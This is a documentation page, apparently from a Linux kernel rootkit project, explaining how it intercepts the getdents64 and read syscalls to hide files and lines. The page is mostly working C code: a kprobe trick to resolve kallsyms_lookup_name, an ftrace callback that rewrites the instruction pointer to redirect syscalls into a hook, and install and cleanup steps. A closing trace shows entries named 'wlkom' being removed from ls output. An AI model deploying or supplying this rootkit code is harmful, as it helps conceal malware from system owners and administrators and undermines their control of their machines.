---
title: Syscall Hooking
description: How the rootkit intercepts kernel syscalls using ftrace and kprobes.
---

To hide files and filter file reads, the rootkit needs to intercept syscalls before they return results to userspace. Both the `getdents64` hook (file hiding) and the `read` hook (line hiding) use the same mechanism, described here.

## Intercepting a syscall with ftrace

The kernel provides **ftrace**, a tracing framework that instruments functions by inserting a `call` instruction at their entry point. Any module can register a callback that fires whenever a target function is called. Inside that callback, `regs->ip` (the instruction pointer) can be overwritten to redirect execution to a different function entirely — our hook — instead of the original syscall.

This gives us a clean intercept point: the hook runs with the original syscall arguments, can call the real syscall itself, then modify the result before returning to userspace.

## Finding the syscall address

To hook `__x64_sys_getdents64`, we first need its address. The natural way to resolve a kernel symbol from a module is `kallsyms_lookup_name()`, but that function has not been exported to modules since kernel 5.7.

The workaround: place a **kprobe** on `kallsyms_lookup_name` itself. The kprobe subsystem resolves the symbol internally when the kprobe is registered, storing the result in `kp.addr`. We can then cast that address to a function pointer and call it to resolve any other symbol we need:

```c
static unsigned long get_symbol(const char *name)
{
    struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };
    typedef unsigned long (*kln_t)(const char *);
    kln_t kln;

    if (register_kprobe(&kp))
        return 0;

    kln = (kln_t)kp.addr;   // real address of kallsyms_lookup_name
    unregister_kprobe(&kp);

    return kln(name);        // resolve any other symbol
}
```

## The hook

With the syscall address in hand, three elements make up the hook:

**1. Pointer to the original syscall** — saved before the hook is installed so the real syscall can still be called from inside our replacement:

```c
static asmlinkage long (*orig_getdents64)(const struct pt_regs *regs);
```

**2. ftrace callback** — called at the entry of `__x64_sys_getdents64`. It redirects execution to our hook by overwriting `regs->ip`:

```c
static void notrace ftrace_callback(unsigned long ip,
                                     unsigned long parent_ip,
                                     struct ftrace_ops *ops,
                                     struct ftrace_regs *fregs)
{
    struct pt_regs *regs = ftrace_get_regs(fregs);
    if (!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long)hook_getdents64;
}
```

The `within_module()` check is necessary to prevent infinite recursion. Our hook needs to call the real `getdents64` via `orig_getdents64` — but that call goes to the same address that ftrace is watching, so ftrace fires again, which would redirect back into our hook, which calls the original again, forever. `within_module(parent_ip, THIS_MODULE)` tests whether the caller's address is inside our own module: if yes (our hook is calling the original), we let it through unchanged; if no (any other caller), we redirect to our hook.

**3. `ftrace_ops` descriptor** — registers the callback and the flags required to use `regs->ip` redirection:

```c
static struct ftrace_ops getdents64_ops = {
    .func  = ftrace_callback,
    .flags = FTRACE_OPS_FL_SAVE_REGS   // expose pt_regs to the callback
           | FTRACE_OPS_FL_IPMODIFY,   // allow overwriting regs->ip
};
```

## Installation and cleanup

```c
// Install
unsigned long addr = get_symbol("__x64_sys_getdents64");
orig_getdents64 = (void *)addr;
ftrace_set_filter_ip(&getdents64_ops, addr, 0, 0);  // target this address only
register_ftrace_function(&getdents64_ops);

// Remove
unregister_ftrace_function(&getdents64_ops);
ftrace_set_filter_ip(&getdents64_ops, (unsigned long)orig_getdents64, 1, 0);
```

The same sequence is applied for `__x64_sys_read` with its own ops and callback.

## Example execution flow

```
ls /etc/modprobe.d/
  → syscall getdents64
      → ftrace fires at __x64_sys_getdents64 entry
          → callback: parent_ip is outside our module → rewrite regs->ip
      → CPU jumps to hook_getdents64
          → hook calls orig_getdents64
              → ftrace fires again
                  → callback: parent_ip is inside our module → let through
              → real getdents64 runs, fills buffer with all entries
          → hook walks buffer, removes entries matching "wlkom"
          → filtered buffer copied back to userspace
  → ls sees no wlkom entries
```
